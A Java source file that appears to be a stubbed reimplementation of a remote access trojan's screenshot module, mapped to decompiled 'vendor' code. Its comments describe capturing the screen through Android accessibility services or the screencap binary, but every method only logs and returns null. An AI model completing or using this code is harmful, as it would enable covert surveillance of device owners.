package com.vendor.rat.keepalive.thread;

import android.util.Log;

import java.util.concurrent.Callable;

/**
 * Vendor: com.guard.wallet.thread.k
 * Takes screenshot via Accessibility API (API 30+).
 */
public final class ScreenshotCallable implements Callable<Object> {

    private static final String TAG = "ScreenshotCallable";
    private final int mode = 0;
    private final Object param;

    /**
     * Vendor: k(Float) - screenshot with quality param
     */
    public ScreenshotCallable(Float quality) {
        // TODO: VENDOR_VERIFY - vendor creates u.a(quality) for API 30+
        this.param = quality;
    }

    /**
     * Vendor: k(String) - screenshot from path
     */
    public ScreenshotCallable(String path) {
        this.param = path;
    }

    /**
     * Vendor: k(boolean) - screenshot with flag
     */
    public ScreenshotCallable(boolean flag) {
        // TODO: VENDOR_VERIFY - vendor creates u.a(flag) for API 30+
        this.param = flag;
    }

    /**
     * Vendor: k.call()
     * mode 0: uses AccessibilityService.takeScreenshot (API 30+)
     * default: uses screencap binary
     */
    @Override
    public Object call() {
        switch (mode) {
            case 0:
                // TODO: VENDOR_VERIFY - vendor uses MyAccessibilityService.P()
                // gets active window displayId, calls takeScreenshot()
                // waits for callback, returns TakeScreenShotResult
                Log.d(TAG, "Taking screenshot via accessibility");
                return null;
            default:
                // TODO: VENDOR_VERIFY - vendor runs screencap, reads file bytes
                Log.d(TAG, "Taking screenshot via screencap");
                return null;
        }
    }
}
